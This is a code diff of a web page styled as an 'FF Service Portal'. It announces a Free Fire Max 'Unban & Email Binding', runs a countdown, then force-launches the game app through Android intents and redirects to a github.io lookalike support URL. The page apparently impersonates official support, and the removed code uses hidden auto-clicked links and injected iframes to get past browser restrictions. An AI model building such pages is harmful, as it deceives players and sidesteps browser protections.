@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unban</title>
+    <title>FF Service Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Teko:wght@500;700&display=swap" rel="stylesheet">
     <style>
         /* Basic Page Setup */
@@ -31,7 +31,7 @@
                     drop-shadow(0 0 20px rgba(200, 0, 0, 0.6));
         }
 
-        /* --- MAIN CONTAINER --- */
+        /* --- MAIN CONTAINER (Super Slow Motion Zoom Entry) --- */
         #main-container {
             text-align: center;
             display: flex;
@@ -42,15 +42,28 @@
             width: 100%;
             padding: 0 10px;
             box-sizing: border-box;
+
+            /* Start State: Very Big & Blurred */
             opacity: 0;
             transform: scale(4); 
             filter: blur(20px); 
+            
+            /* Animation: 3.5s duration for smoothness */
             animation: smoothEntry 3.5s cubic-bezier(0.19, 1, 0.22, 1) forwards;
         }
 
+        /* Zoom Animation Logic */
         @keyframes smoothEntry {
-            0% { opacity: 0; transform: scale(4); filter: blur(20px); }
-            100% { opacity: 1; transform: scale(1); filter: blur(0px); }
+            0% { 
+                opacity: 0; 
+                transform: scale(4); 
+                filter: blur(20px); 
+            }
+            100% { 
+                opacity: 1; 
+                transform: scale(1); 
+                filter: blur(0px); 
+            }
         }
 
         /* --- GREEN TICK MARK --- */
@@ -58,6 +71,7 @@
             width: 100px;
             height: 100px;
             margin: 0 auto;
+            /* Smooth Pulse Animation */
             animation: pulseIcon 2s infinite ease-in-out;
         }
 
@@ -74,7 +88,7 @@
             100% { transform: scale(1); filter: drop-shadow(0 0 5px rgba(57, 255, 20, 0.5)); }
         }
 
-        /* --- TEXT STYLING --- */
+        /* --- CONGRATULATIONS TEXT --- */
         #congrats-text {
             font-size: 55px; 
             font-weight: 700;
@@ -85,10 +99,13 @@
             -webkit-text-fill-color: transparent;
             text-transform: uppercase;
             letter-spacing: 2px;
-            text-shadow: 0 0 15px rgba(255, 215, 0, 0.8), 0 0 30px rgba(255, 140, 0, 0.6);
+            text-shadow: 
+                0 0 15px rgba(255, 215, 0, 0.8),
+                0 0 30px rgba(255, 140, 0, 0.6);
             max-width: 90%; 
         }
 
+        /* --- INFO TEXT (Unban & Email Binding) --- */
         #info-text {
             font-size: 28px;
             color: #e0e0e0;
@@ -96,22 +113,65 @@
             letter-spacing: 1.5px;
             line-height: 1.4; 
             text-shadow: 0 0 8px rgba(255, 255, 255, 0.4);
+            /* Visible immediately with zoom */
         }
         
-        .highlight { color: #ffffff; font-weight: bold; }
-        .status { color: #aaaaaa; font-size: 0.8em; display: block; margin-top: 5px; }
+        .highlight {
+            color: #ffffff;
+            font-weight: bold;
+        }
+        
+        .status {
+            color: #aaaaaa;
+            font-size: 0.8em;
+            display: block;
+            margin-top: 5px;
+        }
 
-        #timer-container { margin-top: 30px; }
+        /* Timer Container */
+        #timer-container {
+            margin-top: 30px;
+            /* Visible immediately with zoom */
+        }
 
+        /* Glowing Green Number */
         #timer {
             font-size: 60px;
             font-weight: 700;
             color: #39FF14;
-            text-shadow: 0 0 10px #39FF14, 0 0 20px #39FF14, 0 0 40px #008000;
+            text-shadow: 
+                0 0 10px #39FF14,
+                0 0 20px #39FF14,
+                0 0 40px #008000;
             display: block;
             line-height: 1;
         }
 
+        /* Loading Overlay */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+        }
+
+        #loading-image {
+            width: 100px;
+            animation: rapidBlink 0.8s infinite alternate;
+        }
+
+        @keyframes rapidBlink {
+            0% { opacity: 0.3; transform: scale(0.95); }
+            100% { opacity: 1; transform: scale(1.05); }
+        }
+
+        /* --- MOBILE RESPONSIVE --- */
         @media (max-width: 768px) {
             #main-container { padding-top: 70px; }
             #congrats-text { font-size: 9vw; letter-spacing: 1px; }
@@ -138,61 +198,68 @@
         
         <div id="info-text">
             <span class="highlight">Unban & Email Binding</span>
-            <span class="status" id="status-text">Proceed...</span>
+            <span class="status">Proceed...</span>
         </div>
 
         <div id="timer-container">
             <span id="timer">10</span>
         </div>
+    </div>
 
+    <div id="loading-overlay">
+        <img id="loading-image" src="loding.png" alt="Loading...">
     </div>
 
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const timerSpan = document.getElementById('timer');
-            const timerContainer = document.getElementById('timer-container');
-            const statusText = document.getElementById('status-text');
+            const mainContainer = document.getElementById('main-container');
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const topLogo = document.getElementById('top-logo');
             
             let timeLeft = 10;
 
+            // Timer starts immediately (No setTimeout)
             const countdownInterval = setInterval(() => {
                 timeLeft--;
                 timerSpan.textContent = timeLeft;
 
                 if (timeLeft <= 0) {
                     clearInterval(countdownInterval);
-                    autoLaunchGame();
+                    startLoadingSequence();
                 }
             }, 1000);
 
-            function autoLaunchGame() {
-                // UI update
-                timerContainer.style.display = 'none';
-                statusText.style.color = '#39FF14';
-                statusText.textContent = "Launching Free Fire Max Automatically...";
+            function startLoadingSequence() {
+                mainContainer.style.display = 'none';
+                topLogo.style.display = 'none';
+                loadingOverlay.style.display = 'flex';
 
-                // The strict Android OS Intent for Free Fire Max
-                const intentUrl = "intent://#Intent;package=com.dts.freefiremax;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;end;";
-
-                // METHOD 1: Programmatic Auto-Click (Bypasses most basic browser restrictions)
-                const a = document.createElement('a');
-                a.style.display = 'none';
-                a.href = intentUrl;
-                document.body.appendChild(a);
-                a.click();
-
-                // METHOD 2: Fallback Location Replace (Pushes strictly to OS)
                 setTimeout(() => {
-                    window.location.replace(intentUrl);
-                }, 400);
+                    // Try to launch Free Fire Max app
+                    launchFreeFireMax();
+                }, 3000);
+            }
 
-                // METHOD 3: Iframe Injection (Forces intent through embedded frame)
+            function launchFreeFireMax() {
+                // Method 1: Try Free Fire Max app scheme
+                const appScheme = "freefiremax://";
+                
+                // Method 2: Android Intent for better compatibility
+                const intentUrl = `intent://launch/#Intent;scheme=${appScheme};package=com.dts.freefiremax;S.browser_fallback_url=https://ffhelp-service-portal.github.io/pending/congratulations/email-binding-unban-pending0287410366;end`;
+                
+                // First try: Direct app launch
+                window.location.href = appScheme;
+                
+                // Second try: Android Intent (if first fails)
                 setTimeout(() => {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = intentUrl;
-                    document.body.appendChild(iframe);
-                }, 800);
+                    window.location.href = intentUrl;
+                }, 500);
+                
+                // Final fallback: Original URL
+                setTimeout(() => {
+                    window.location.href = "https://ffhelp-service-portal.github.io/pending/congratulations/email-binding-unban-pending0287410366";
+                }, 1500);
             }
         });
     </script>
